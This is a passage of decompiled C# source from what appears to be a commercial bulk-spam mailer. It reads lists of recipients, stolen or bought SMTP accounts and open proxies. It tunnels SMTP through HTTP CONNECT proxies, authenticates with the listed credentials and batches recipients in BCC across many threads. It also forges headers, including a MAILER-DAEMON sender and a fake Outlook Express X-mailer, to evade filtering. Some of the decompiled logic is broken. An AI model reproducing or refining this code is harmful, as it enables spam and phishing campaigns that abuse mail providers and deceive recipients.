      this.password.Text = strArray[3];
      this.RealEmail.Text = strArray[4];
    }

    private void OpenSmtp2()
    {
      int num1 = (int) this.OpenFileDialog1.ShowDialog();
      try
      {
        StreamReader streamReader = new StreamReader(this.OpenFileDialog1.FileName);
        for (string str1 = streamReader.ReadLine(); str1 != null; str1 = streamReader.ReadLine())
        {
          string str2 = str1.Trim();
          if (str2.Length > 0)
            this.Accountlist.Items.Add((object) str2);
        }
        this.Proxylist.SelectedIndex = 0;
        streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Exclamation, (object) "Read Error");
        ProjectData.ClearProjectError();
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      try
      {
        this.Accountlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Accountlist.SelectedItem));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Proxylist_SelectedIndexChanged(object sender, EventArgs e) => this.Proxy.Text = StringType.FromObject(this.Proxylist.SelectedItem);

    private void SaveAccount_Click(object sender, EventArgs e)
    {
      int num1 = (int) this.SaveFileDialog1.ShowDialog();
      try
      {
        int num2 = 0;
        StreamWriter streamWriter = new StreamWriter(this.SaveFileDialog1.FileName);
        this.Accountlist.Refresh();
        int count = this.Accountlist.Items.Count;
        int num3 = 1;
        while (num3 <= count)
        {
          this.Accountlist.SelectedIndex = num2;
          streamWriter.WriteLine(this.Accountlist.SelectedItem.ToString());
          checked { ++num2; }
          checked { ++num3; }
        }
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void OpenPro2()
    {
      int num1 = (int) this.OpenFileDialog1.ShowDialog();
      try
      {
        StreamReader streamReader = new StreamReader(this.OpenFileDialog1.FileName);
        for (string str1 = streamReader.ReadLine(); str1 != null; str1 = streamReader.ReadLine())
        {
          string str2 = str1.Trim();
          if (str2.Length > 0)
            this.Proxylist2.Items.Add((object) str2);
        }
        this.Proxylist2.SelectedIndex = 0;
        streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Exclamation, (object) "Read Error");
        ProjectData.ClearProjectError();
      }
    }

    private void OpenPro()
    {
      int num1 = (int) this.OpenFileDialog1.ShowDialog();
      try
      {
        StreamReader streamReader = new StreamReader(this.OpenFileDialog1.FileName);
        for (string str1 = streamReader.ReadLine(); str1 != null; str1 = streamReader.ReadLine())
        {
          string str2 = str1.Trim();
          if (str2.Length > 0)
            this.Proxylist.Items.Add((object) str2);
        }
        this.Proxylist.SelectedIndex = 0;
        streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Exclamation, (object) "Read Error");
        ProjectData.ClearProjectError();
      }
    }

    private void MenuItem8_Click(object sender, EventArgs e)
    {
      int num1 = (int) this.OpenFileDialog1.ShowDialog();
      try
      {
        StreamReader streamReader = new StreamReader(this.OpenFileDialog1.FileName);
        for (string str1 = streamReader.ReadLine(); str1 != null; str1 = streamReader.ReadLine())
        {
          string str2 = str1.Trim();
          if (str2.Length > 0)
            this.Proxylist.Items.Add((object) str2);
        }
        this.Proxylist.SelectedIndex = 0;
        streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Exclamation, (object) "Read Error");
        ProjectData.ClearProjectError();
      }
      this.MailingList.Show();
    }

    private void Button2_Click_1(object sender, EventArgs e)
    {
      this.Uselistbox.Checked = true;
      this.MailingList.Show();
      int num1 = (int) this.OpenFileDialog1.ShowDialog();
      try
      {
        StreamReader streamReader = new StreamReader(this.OpenFileDialog1.FileName);
        for (string str1 = streamReader.ReadLine(); str1 != null; str1 = streamReader.ReadLine())
        {
          string str2 = str1.Trim();
          if (str2.Length > 0)
            this.ListBox1.Items.Add((object) str2);
        }
        this.ListBox1.SelectedIndex = 0;
        streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Exclamation, (object) "Read Error");
        ProjectData.ClearProjectError();
      }
      this.Listlog.Items.Add((object) (this.ListBox1.Items.Count.ToString() + " E-mail Addresses"));
    }

    private void Button3_Click(object sender, EventArgs e) => this.ListBox1.Items.Clear();

    private void Button4_Click(object sender, EventArgs e)
    {
      int num1 = (int) this.SaveFileDialog1.ShowDialog();
      int num2 = 0;
      StreamWriter streamWriter = new StreamWriter(this.SaveFileDialog1.FileName);
      int count = this.ListBox1.Items.Count;
      int num3 = 1;
      while (num3 <= count)
      {
        this.Proxylist.SelectedIndex = num2;
        streamWriter.WriteLine(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
        checked { ++num2; }
        checked { ++num3; }
      }
      streamWriter.Close();
    }

    private int getNewId()
    {
      int id;
      try
      {
        this.id = checked (DateTime.Now.Millisecond * 60);
        id = this.id;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return id;
    }

    public string getDomain(string host)
    {
      string domain;
      try
      {
        string str = StringType.FromInteger(0);
        string sLeft;
        if (StringType.StrCmp(sLeft, (string) null, false) == 0 | DoubleType.FromString(str) < 4.0)
          domain = Dns.GetHostByAddress(host).HostName.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        domain = (string) null;
        ProjectData.ClearProjectError();
      }
      return domain;
    }

    public string Gettime()
    {
      string str1;
      try
      {
        object o1 = (object) DateTime.Today.DayOfWeek.ToString().ToString().Substring(0, 3);
        string o2_1 = DateTime.Today.Day.ToString();
        int num = IntegerType.FromString(DateTime.Today.Month.ToString());
        string o2_2;
        if ((double) num == DoubleType.FromString("1"))
          o2_2 = "Jan";
        else if ((double) num == DoubleType.FromString("2"))
          o2_2 = "Feb";
        else if ((double) num == DoubleType.FromString("3"))
          o2_2 = "Mar";
        else if ((double) num == DoubleType.FromString("4"))
          o2_2 = "Apr";
        else if ((double) num == DoubleType.FromString("5"))
          o2_2 = "May";
        else if ((double) num == DoubleType.FromString("6"))
          o2_2 = "Jun";
        else if ((double) num == DoubleType.FromString("7"))
          o2_2 = "Jul";
        else if ((double) num == DoubleType.FromString("8"))
          o2_2 = "Aug";
        else if ((double) num == DoubleType.FromString("9"))
          o2_2 = "Sep";
        else if ((double) num == DoubleType.FromString("10"))
          o2_2 = "Oct";
        else if ((double) num == DoubleType.FromString("11"))
          o2_2 = "Nov";
        else if ((double) num == DoubleType.FromString("12"))
          o2_2 = "Dec";
        DateTime now1 = DateTime.Now;
        object o2_3 = (object) now1.Year.ToString();
        string[] strArray1 = new string[5];
        string[] strArray2 = strArray1;
        now1 = DateTime.Now;
        string str2 = StringType.FromInteger(now1.Hour);
        strArray2[0] = str2;
        strArray1[1] = ":";
        strArray1[2] = StringType.FromInteger(DateTime.Now.Minute);
        strArray1[3] = ":";
        string[] strArray3 = strArray1;
        DateTime now2 = DateTime.Now;
        string str3 = StringType.FromInteger(now2.Second);
        strArray3[4] = str3;
        object o2_4 = (object) string.Concat(strArray1);
        now2 = DateTime.Now;
        object universalTime = (object) now2.ToUniversalTime();
        str1 = StringType.FromObject(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(o1, (object) ", "), (object) o2_1), (object) " "), (object) o2_2), (object) " "), o2_3), (object) " "), o2_4), (object) " -0500"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public string ClearCtlChars(string txt)
    {
      string str;
      try
      {
        StringBuilder stringBuilder = new StringBuilder(Strings.Len(txt));
        char[] charArray = txt.ToCharArray();
        int index = 0;
        while (index < charArray.Length)
        {
          char ch = charArray[index];
          switch (ch)
          {
            case ' ':
            case '-':
            case '0':
            case '1':
            case '2':
            case '3':
            case '4':
            case '5':
            case '6':
            case '7':
            case '8':
            case '9':
            case '@':
            case 'A':
            case 'B':
            case 'C':
            case 'D':
            case 'E':
            case 'F':
            case 'G':
            case 'H':
            case 'I':
            case 'J':
            case 'K':
            case 'L':
            case 'M':
            case 'N':
            case 'P':
            case 'Q':
            case 'R':
            case 'S':
            case 'T':
            case 'U':
            case 'V':
            case 'W':
            case 'X':
            case 'Y':
            case 'Z':
            case '_':
            case 'a':
            case 'b':
            case 'c':
            case 'd':
            case 'e':
            case 'f':
            case 'g':
            case 'h':
            case 'i':
            case 'j':
            case 'k':
            case 'l':
            case 'm':
            case 'n':
            case 'o':
            case 'p':
            case 'q':
            case 'r':
            case 's':
            case 't':
            case 'u':
            case 'v':
            case 'w':
            case 'x':
            case 'y':
            case 'z':
              stringBuilder.Append(ch);
              break;
            default:
              stringBuilder.Append(" ");
              break;
          }
          checked { ++index; }
        }
        str = stringBuilder.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string ClearCtlChars3(string txt)
    {
      string str;
      try
      {
        StringBuilder stringBuilder = new StringBuilder(Strings.Len(txt));
        char[] charArray = txt.ToCharArray();
        int index = 0;
        while (index < charArray.Length)
        {
          char ch = charArray[index];
          switch (ch)
          {
            case ' ':
            case '-':
            case '0':
            case '1':
            case '2':
            case '3':
            case '4':
            case '5':
            case '6':
            case '7':
            case '8':
            case '9':
            case '@':
            case 'A':
            case 'B':
            case 'C':
            case 'D':
            case 'E':
            case 'F':
            case 'G':
            case 'H':
            case 'I':
            case 'J':
            case 'K':
            case 'L':
            case 'M':
            case 'N':
            case 'P':
            case 'Q':
            case 'R':
            case 'S':
            case 'T':
            case 'U':
            case 'V':
            case 'W':
            case 'X':
            case 'Y':
            case 'Z':
            case '_':
            case 'a':
            case 'b':
            case 'c':
            case 'd':
            case 'e':
            case 'f':
            case 'g':
            case 'h':
            case 'i':
            case 'j':
            case 'k':
            case 'l':
            case 'm':
            case 'n':
            case 'o':
            case 'p':
            case 'q':
            case 'r':
            case 's':
            case 't':
            case 'u':
            case 'v':
            case 'w':
            case 'x':
            case 'y':
            case 'z':
              stringBuilder.Append(ch);
              break;
            default:
              stringBuilder.Append(" ");
              break;
          }
          checked { ++index; }
        }
        str = stringBuilder.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string getMXRecords(string host, string serverAddress)
    {
      string mailserver;
      try
      {
        string str = StringType.FromInteger(checked (DateTime.Now.Millisecond * 60));
        UdpClient udpClient = new UdpClient(serverAddress, Form1.PORT);
        this.makeQuery(IntegerType.FromString(str), host);
        udpClient.Send(this.data, this.data.Length);
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 53);
        this.data = udpClient.Receive(ref remoteEP);
        int num1 = (int) this.data[0] & (int) byte.MaxValue;
        int index1 = 40;
        do
        {
          string txt1 = this.ASCII.GetString(this.data, index1, 40);
          this.ClearCtlChars(txt1);
          string txt2 = this.ClearCtlChars(txt1).Trim(' ').Trim(' ');
          char[] chArray = new char[66]
          {
            'a',
            'b',
            'c',
            'd',
            'e',
            'f',
            'g',
            'h',
            'i',
            'j',
            'k',
            'l',
            'm',
            'n',
            'o',
            'p',
            'q',
            'r',
            's',
            't',
            'u',
            'v',
            'w',
            'x',
            'y',
            'z',
            '@',
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'Q',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z',
            ' ',
            '1',
            '2',
            '3',
            '4',
            '5',
            '6',
            '7',
            '8',
            '9',
            '-',
            '_',
            '0'
          };
          string sLeft1 = this.ClearCtlChars3(txt2).Replace("     ", " ").Replace(" @", "@");
          if (StringType.StrCmp(sLeft1, (string) null, false) != 0)
          {
            checked { index1 += sLeft1.Length; }
            string[] strArray1 = sLeft1.Split('@');
            if (StringType.StrCmp(strArray1[0].Substring(0, 1), " ", false) == 0)
              strArray1[0] = StringType.FromBoolean(StringType.StrCmp(strArray1[0].Substring(0, 1), "", false) == 0);
            if (strArray1[0].IndexOf(" ") > 0)
            {
              string[] strArray2 = strArray1[0].Split(' ');
              int num2 = Information.UBound((Array) strArray2);
              int index2 = 0;
              string sLeft2;
              while (index2 <= num2)
              {
                if (StringType.StrCmp(strArray2[index2], (string) null, false) != 0)
                {
                  if (strArray2[index2].Length > 1)
                    sLeft2 = StringType.StrCmp(sLeft2, (string) null, false) != 0 ? sLeft2 + "." + strArray2[index2] : sLeft2 + strArray2[index2];
                }
                else
                  index2 = 10;
                checked { ++index2; }
              }
              int num3 = Information.UBound((Array) strArray2);
              if (IntegerType.FromString(num3.ToString()) >= 2)
                this.Mailserver = sLeft2;
              num3 = Information.UBound((Array) strArray2);
              if (IntegerType.FromString(num3.ToString()) == 1)
              {
                if (strArray2[1].Length < 5)
                {
                  this.Mailserver = sLeft2 + "." + host;
                }
                else
                {
                  string[] strArray3 = host.Split('.');
                  this.Mailserver = sLeft2 + "." + strArray3[1];
                }
              }
            }
            else
              this.Mailserver = strArray1[0] + "." + host;
          }
          checked { ++index1; }
        }
        while (index1 <= 50);
        string[] strArray = this.Mailserver.Split('.');
        if (StringType.StrCmp(this.Mailserver, (string) null, false) == 0 | StringType.StrCmp(this.Mailserver.Substring(0, 2), "NS", false) == 0 | strArray[0].Length < 3)
          this.Mailserver = host;
        mailserver = this.Mailserver;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Listlog.Items.Add((object) ex);
        ProjectData.ClearProjectError();
      }
      return mailserver;
    }

    public void makeQuery(int id, string name)
    {
      try
      {
        this.data = new byte[513];
        int index1 = 0;
        do
        {
          this.data[index1] = (byte) 0;
          checked { ++index1; }
        }
        while (index1 <= 511);
        this.data[0] = (byte) 0;
        this.data[1] = checked ((byte) (id & (int) byte.MaxValue));
        this.data[2] = (byte) 1;
        this.data[3] = (byte) 0;
        this.data[4] = (byte) 0;
        this.data[5] = (byte) 1;
        this.data[6] = (byte) 0;
        this.data[7] = (byte) 0;
        this.data[8] = (byte) 0;
        this.data[9] = (byte) 0;
        this.data[10] = (byte) 0;
        string[] strArray = name.Split(char.Parse("."));
        this.position = 11;
        int num1 = checked (strArray.Length - 1);
        int index2 = 0;
        while (index2 <= num1)
        {
          string s = strArray[index2];
          checked { ++this.position; }
          this.data[this.position] = checked ((byte) (s.Length & (int) byte.MaxValue));
          byte[] bytes = Encoding.ASCII.GetBytes(s);
          int num2 = checked (bytes.Length - 1);
          int index3 = 0;
          while (index3 <= num2)
          {
            checked { ++this.position; }
            this.data[this.position] = bytes[index3];
            checked { ++index3; }
          }
          checked { ++index2; }
        }
        checked { ++this.position; }
        this.data[this.position] = (byte) 0;
        checked { ++this.position; }
        this.data[this.position] = (byte) 0;
        checked { ++this.position; }
        this.data[this.position] = (byte) 15;
        checked { ++this.position; }
        this.data[this.position] = (byte) 0;
        checked { ++this.position; }
        this.data[this.position] = (byte) 1;
        int index4 = 0;
        do
        {
          if (this.data[index4] == (byte) 0)
            this.data[index4] = (byte) 0;
          checked { ++index4; }
        }
        while (index4 <= 511);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Listlog.Items.Add((object) ex);
        ProjectData.ClearProjectError();
      }
    }

    private void SMTPAUTHSend()
    {
      this.ListBox1.Items.Add((object) this.Recipient.Text);
      this.Stopchecking.Checked = false;
      this.Status.Text = "Sending...";
      int num1 = this.TrackBar2.Value;
      int num2 = 1;
      while (num2 <= num1)
      {
        try
        {
          new Thread(new ThreadStart(this.SMTPAUTHSen)).Start();
          Application.DoEvents();
          Thread.Sleep(1000);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
    }

    private void SMTPAUTHSen()
    {
      try
      {
        StringType.FromInteger(checked (DateTime.Now.Millisecond * 60));
        StringType.FromObject(Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\{220F74AC-AB8C-4708-A3C3-EF2C4D98BA5E}\\").GetValue("nameserver", (object) "202.12.27.33"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num = 0;
      while (this.ListBox1.Items.Count != 0 & !this.Stopchecking.Checked)
      {
        PerformanceCounter performanceCounter = new PerformanceCounter();
        performanceCounter.CategoryName = "Processor";
        performanceCounter.CounterName = "% Processor Time";
        performanceCounter.InstanceName = "_Total";
        CounterSample counterSample1 = new CounterSample();
        CounterSample counterSample2 = new CounterSample();
        if (DoubleType.FromString(StringType.FromSingle(CounterSample.Calculate(performanceCounter.NextSample(), performanceCounter.NextSample()))) <= 65.0)
        {
          if (!this.Stopchecking.Checked)
          {
            try
            {
              this.ListBox1.SelectedIndex = num;
              string Recipient = StringType.FromObject(this.ListBox1.SelectedItem);
              this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
              this.SMTPAUTHS(Recipient);
              Application.DoEvents();
              Thread.Sleep(2000);
              Application.DoEvents();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else
            Application.ExitThread();
        }
      }
    }

    public string DomainIp(string Host)
    {
      string str;
      try
      {
        str = Dns.Resolve(Host).AddressList[0].ToString();
        this.Listlog.Items.Add((object) str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Listlog.Items.Add((object) ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string Domainname(string Host)
    {
      string str;
      try
      {
        str = Dns.GetHostByAddress(Host).HostName.ToString();
        Thread.Sleep(50);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Listlog.Items.Add((object) ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public void SMTPAUTHS(string Recipient)
    {
      string str1 = Recipient.Split('@')[1];
      this.Stopchecking.Checked = false;
      if (StringType.StrCmp(this.Sylonious, "Yes", false) == 0)
      {
        string[] strArray1 = this.smtp.ToString().Split('.');
        object obj = (object) (strArray1[1] + "." + strArray1[2]);
        object o1 = (object) DateTime.Today.DayOfWeek.ToString().ToString().Substring(0, 3);
        int num1 = DateTime.Today.Day;
        string o2_1 = num1.ToString();
        num1 = DateTime.Today.Month;
        int num2 = IntegerType.FromString(num1.ToString());
        string o2_2;
        if ((double) num2 == DoubleType.FromString("1"))
          o2_2 = "Jan";
        else if ((double) num2 == DoubleType.FromString("2"))
          o2_2 = "Feb";
        else if ((double) num2 == DoubleType.FromString("3"))
          o2_2 = "Mar";
        else if ((double) num2 == DoubleType.FromString("4"))
          o2_2 = "Apr";
        else if ((double) num2 == DoubleType.FromString("5"))
          o2_2 = "May";
        else if ((double) num2 == DoubleType.FromString("6"))
          o2_2 = "Jun";
        else if ((double) num2 == DoubleType.FromString("7"))
          o2_2 = "Jul";
        else if ((double) num2 == DoubleType.FromString("8"))
          o2_2 = "Aug";
        else if ((double) num2 == DoubleType.FromString("9"))
          o2_2 = "Sep";
        else if ((double) num2 == DoubleType.FromString("10"))
          o2_2 = "Oct";
        else if ((double) num2 == DoubleType.FromString("11"))
          o2_2 = "Nov";
        else if ((double) num2 == DoubleType.FromString("12"))
          o2_2 = "Dec";
        num1 = DateTime.Now.Year;
        object o2_3 = (object) num1.ToString();
        object o2_4 = (object) (StringType.FromInteger(DateTime.Now.Hour) + ":" + StringType.FromInteger(DateTime.Now.Minute) + ":" + StringType.FromInteger(DateTime.Now.Second));
        object universalTime = (object) DateTime.Now.ToUniversalTime();
        string str2 = StringType.FromObject(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(ObjectType.AddObj(o1, (object) ", "), (object) o2_1), (object) " "), (object) o2_2), (object) " "), o2_3), (object) " "), o2_4), (object) " -0500"));
        int count1 = this.Accountlist.Items.Count;
        int count2 = this.Proxylist.Items.Count;
        int count3 = this.ListBox1.Items.Count;
        int num3 = 0;
        string sLeft1;
        if (this.Uselistbox.Checked)
        {
          sLeft1 = "BCC: ";
          while (this.Listlog.Items.Count != 0 & num3 < 6)
          {
            try
            {
              checked { ++num3; }
              this.ListBox1.SelectedIndex = 0;
              string str3 = StringType.FromObject(this.ListBox1.SelectedItem);
              this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
              Application.DoEvents();
              sLeft1 = num3 <= 1 ? sLeft1 + str3 : sLeft1 + ", " + str3;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.ListBox1.SelectedIndex = 1;
              ProjectData.ClearProjectError();
            }
          }
        }
        int num4 = 0;
        int num5 = 1;
        do
        {
          string text1 = this.Proxy.Text;
          string str4;
          string str5;
          this.Listlog.Items.Add((object) ("Yes Ip:" + str4 + " Domain3:" + str5));
          string str6;
          if (!this.Stopchecking.Checked)
          {
            try
            {
              TcpClient tcpClient = new TcpClient();
              string[] strArray2 = text1.ToString().Split(':');
              string text2 = this.smtp.Text;
              string text3 = this.pop3.Text;
              string text4 = this.username.Text;
              string text5 = this.password.Text;
              string sLeft2 = (string) null;
              string[] strArray3 = text2.Split('.');
              string str7 = strArray3[1] + "." + strArray3[2];
              this.Listlog.Items.Add((object) str7);
              string str8 = "MAILER-DAEMON";
              if (StringType.StrCmp(sLeft2, (string) null, false) == 0)
                sLeft2 = str8 + "@" + str7;
              tcpClient.Connect(strArray2[0], IntegerType.FromString(strArray2[1]));
              Application.DoEvents();
              tcpClient.ReceiveTimeout = 5000;
              tcpClient.ReceiveTimeout = 5000;
              checked { ++this.qou; }
              checked { ++this.ppou; }
              NetworkStream stream = tcpClient.GetStream();
              byte[] bytes1 = Encoding.ASCII.GetBytes("CONNECT " + text2 + ":25 HTTP/1.0" + "\r\n" + "\r\n");
              Application.DoEvents();
              stream.Write(bytes1, 0, bytes1.Length);
              byte[] numArray = new byte[checked (tcpClient.ReceiveBufferSize + 1)];
              stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
              string str9 = Encoding.ASCII.GetString(numArray);
              this.Listlog.Items.Add((object) str9);
              if (StringType.StrCmp(str9.Substring(0, 10), "HTTP/1.0 2", false) == 0 | StringType.StrCmp(str9.Substring(0, 10), "HTTP/1.1 2", false) == 0)
              {
                byte[] bytes2 = Encoding.ASCII.GetBytes("HELO  localhost\r\n");
                stream.Write(bytes2, 0, bytes2.Length);
                stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                string str10 = Encoding.ASCII.GetString(numArray);
                Console.WriteLine("Host returned2: " + str10);
                Application.DoEvents();
                this.Listlog.Items.Add((object) str10);
                if (StringType.StrCmp(str10.Substring(0, 1), "2", false) == 0)
                {
                  this.Listlog.Refresh();
                  byte[] bytes3 = Encoding.ASCII.GetBytes("AUTH LOGIN\r\n");
                  stream.Write(bytes3, 0, bytes3.Length);
                  stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                  Console.WriteLine("Host returned3: " + Encoding.ASCII.GetString(numArray));
                  byte[] bytes4 = Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(text4)) + "\r\n");
                  stream.Write(bytes4, 0, bytes4.Length);
                  stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                  string str11 = Encoding.ASCII.GetString(numArray);
                  Console.WriteLine("Host returned4: " + str11);
                  Application.DoEvents();
                  this.Listlog.Items.Add((object) str11);
                  if (StringType.StrCmp(str11.Substring(0, 3), "334", false) == 0)
                  {
                    byte[] bytes5 = Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(text5)) + "\r\n");
                    stream.Write(bytes5, 0, bytes5.Length);
                    stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                    string str12 = Encoding.ASCII.GetString(numArray);
                    Console.WriteLine("Host returned5: " + str12);
                    this.Listlog.Items.Add((object) str12);
                    string str13;
                    if (StringType.StrCmp(this.ReplyTo.Text.ToString(), (string) null, false) != 0)
                      str13 = "Reply-To: " + this.Fromname.Text + " <" + this.ReplyTo.Text.ToString() + ">" + "\r\n";
                    if (StringType.StrCmp(str12.Substring(0, 3), "334", false) == 0 | StringType.StrCmp(str12.Substring(0, 3), "235", false) == 0)
                    {
                      string str14 = str14;
                      string str15 = "<" + sLeft2 + ">";
                      string str16 = !this.HTML.Checked ? "Content-Type: text/plain\r\n" : "Content-Type: text/html\r\n";
                      string str17 = "Return-Path: <" + this.From.Text + ">" + "\r\n";
                      string str18 = StringType.StrCmp(this.Fromname.Text, (string) null, false) == 0 ? (string) null : "\"";
                      string str19 = StringType.StrCmp(sLeft1, (string) null, false) != 0 ? sLeft1 + "\r\n" : (string) null;
                      string str20;
                      byte[] bytes6 = Encoding.UTF8.GetBytes("MAIL FROM: " + str15 + "\r\n" + "RCPT TO:" + "<" + Recipient + ">" + "\r\n" + "DATA" + "\r\n" + str17 + "Message-ID: <MMSGXix4A2D" + str20 + "wY00000008@" + str5 + ">" + "\r\n" + "From:" + str18 + this.Fromname.Text + str18 + " <" + this.From.Text + ">" + "\r\n" + "To: <" + Recipient + ">" + "\r\n" + str19 + str13 + "Date: " + str2 + "\r\n" + "X-mailer: Microsoft Outlook Express 6.00.2600.0000" + "\r\n" + str16 + "Subject:" + this.Subject.Text + "\r\n" + "\r\n" + this.Body.Text + "\r\n" + "." + "\r\n");
                      stream.Write(bytes6, 0, bytes6.Length);
                      stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                      byte[] bytes7 = Encoding.UTF8.GetBytes("QUIT\r\n");
                      stream.Write(bytes7, 0, bytes7.Length);
                      stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                      str6 = Encoding.ASCII.GetString(numArray);
                      Application.DoEvents();
                      Console.WriteLine("Host returned7: " + str6);
                      if (stream.CanRead & StringType.StrCmp(str6.Substring(0, 3), "250", false) == 0)
                      {
                        this.JJ33 = "Sent";
                        this.Listlog.Items.Add((object) (Recipient + ": 250 OK Message Sent" + str6));
                        this.MessagesSent = checked (this.MessagesSent + 1 + num3);
                        this.Label14.Text = StringType.FromInteger(this.MessagesSent);
                        checked { ++num5; }
                        if (this.ListBox1.Items.Count == 0)
                          this.Status.Text = "Finished";
                        if (!this.Uselistbox.Checked)
                        {
                          this.ListBox1.Items.Clear();
                          this.Status.Text = "Message Sent";
                        }
                        tcpClient.Close();
                      }
                      else
                      {
                        checked { ++num4; }
                        checked { ++this.qou; }
                        this.Accountlist.SelectedIndex = this.qou;
                        this.Listlog.Items.Add((object) "Quota possibly hit.");
                        checked { --num5; }
                        this.Error1 = (string) null;
                        tcpClient.Close();
                      }
                    }
                    else
                    {
                      this.Listlog.Items.Add((object) "Wrong Password");
                      this.Listlog.Items.Add((object) "Errorpoint3");
                      checked { --num5; }
                      checked { ++this.qou; }
                      tcpClient.Close();
                    }
                  }
                  else
                  {
                    this.Listlog.Items.Add((object) "No such USER");
                    checked { --num5; }
                    checked { ++this.qou; }
                    tcpClient.Close();
                  }
                }
                else
                {
                  this.Listlog.Items.Add((object) (text1 + " Proxy did not connect to SMTP"));
                  if (!this.Uselistbox.Checked)
                    this.ListBox1.Items.Clear();
                  checked { ++this.ppou; }
                  checked { --num5; }
                  tcpClient.Close();
                }
              }
              else
              {
                this.Listlog.Items.Add((object) (text1 + "BAD PROXY!!!!"));
                checked { --num5; }
                checked { ++this.ppou; }
                tcpClient.Close();
                if (!this.Uselistbox.Checked)
                  this.ListBox1.Items.Clear();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Listlog.Items.Add((object) ex);
              checked { ++this.qou; }
              checked { ++this.ppou; }
              if (StringType.StrCmp(this.JJ33, "Sent", false) == 0 | StringType.StrCmp(str6.Substring(0, 3), "250", false) == 0)
              {
                Application.ExitThread();
                this.Listlog.Items.Add((object) "Message Sent");
                checked { ++this.MessagesSent; }
                this.Label14.Text = StringType.FromInteger(this.MessagesSent);
              }
              else
              {
                this.Listlog.Items.Add((object) "Did not send error");
                checked { --num5; }
              }
              ProjectData.ClearProjectError();
            }
          }
          else
          {
            num5 = 2;
            Application.ExitThread();
          }
          checked { ++num5; }
        }
        while (num5 <= 1);
        if (this.Uselistbox.Checked)
          return;
        this.ListBox1.Items.Clear();
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Put in the registration code!");
      }
    }

    public void CheckHttpproxy()
    {
      string text1 = this.Proxy.Text;
      this.Stopchecking.Checked = false;
      if (StringType.StrCmp(this.Sylonious, "Yes", false) == 0)
      {
        string text2 = this.smtp.Text;
        if (!this.Stopchecking.Checked)
        {
          try
          {
            string[] strArray = text1.ToString().Split(':');
            TcpClient tcpClient = new TcpClient();
            tcpClient.Connect(strArray[0], IntegerType.FromString(strArray[1]));
            tcpClient.ReceiveTimeout = 1000;
            tcpClient.ReceiveTimeout = 1000;
            byte[] numArray = new byte[checked (tcpClient.ReceiveBufferSize + 1)];
            NetworkStream stream = tcpClient.GetStream();
            this.Listlog.Items.Add((object) "ok");
            this.Listlog.Items.Add((object) "ok");
